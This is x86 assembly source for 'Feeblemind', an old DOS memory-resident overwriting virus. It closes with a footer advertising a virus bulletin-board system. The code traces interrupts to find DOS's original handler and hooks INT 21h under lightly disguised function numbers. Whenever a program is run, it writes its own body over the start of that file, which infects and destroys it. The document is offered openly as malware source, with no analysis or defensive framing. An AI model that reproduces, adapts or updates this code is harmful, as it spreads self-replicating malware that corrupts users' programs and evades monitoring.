;
; Feeblemind
;
Start:          Jmp Install

Old21           Dd 0

Org21           Dd 0

Inc10:          Add Ah,10h
Eoi:            Jmp Dword Ptr Cs:[Org21]

New21:          Sub Ah,10h
                Cmp Ax,3b00h
                Jne Inc10
                Push Ax
                Push Bx
                Push Cx
                Push Dx
                Push Ds
                Push Es
                Push Si
                Push Di
                Mov Ax,3d02h
                Pushf
                Call Dword ptr Cs:[Old21]
                Xchg Ax,Bx
                Mov Ah,30h
                Add Ah,10h
                Mov Cx,VLen
                Lea Dx,Start
                Mov Ds,Cs
                Pushf
                Call Dword ptr Cs:[Old21]
                Mov Ah,3eh
                Pushf
                Call Dword Ptr Cs:[old21]
                Pop Di
                Pop Si
                Pop Es
                Pop Ds
                Pop Dx
                Pop Cx
                Pop Bx
                Pop Ax
                Jmp EOI

                Db '[Feeblemind]'

Install:        Mov Ax,3501h
                Int 21h
                Mov Word Ptr Cs:[Old1],Bx
                Mov Word Ptr Cs:[Old1][2],Es
                Mov Ax,2501h
                Mov Ds,Cs
                Lea Dx,New1
                Int 21h

                Cli
                Pushf
                Pop Ax
                Or Ah,1
                Push Ax
                Popf
                Sti

                Mov Ah,30h
                Int 21h

                Cli
                Pushf
                Pop Ax
                And Ah,0feh
                Push Ax
                Popf
                Sti

                Mov Ds,Word ptr Cs:[Old1][2]
                Mov Dx,Word ptr Cs:[Old1]
                Mov Ax,2501h
                Int 21h

                Mov Ax,1521h
                Add Ah,20h
                Int 21h
                Mov Word Ptr Cs:[Org21],Bx
                Mov Word Ptr Cs:[Org21][2],Es

                Mov Ax,1521h
                Add Ah,10h
                Mov Ds,Cs
                Lea Dx,New21
                Int 21h
                Lea Dx,EndByte
                Int 27h

Old1            Dd 0

New1:           Push Bp
                Mov Bp,Sp

                Cmp Word Ptr Ss:[Bp][4],116h
                Jne Einde
                Push Ax
                Mov Ax,Ss:[Bp][4]
                Mov Word Ptr Cs:[Old21][2],Ax
                Mov Ax,Ss:[Bp][2]
                Mov Word Ptr Cs:[Old21],Ax
                And Word Ptr Ss:[Bp][6],0fffeh
                Pop Ax
Einde:          Pop Bp
                Iret

Endbyte         Db 0
Vlen            Equ $-Start

;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄ> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <ÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
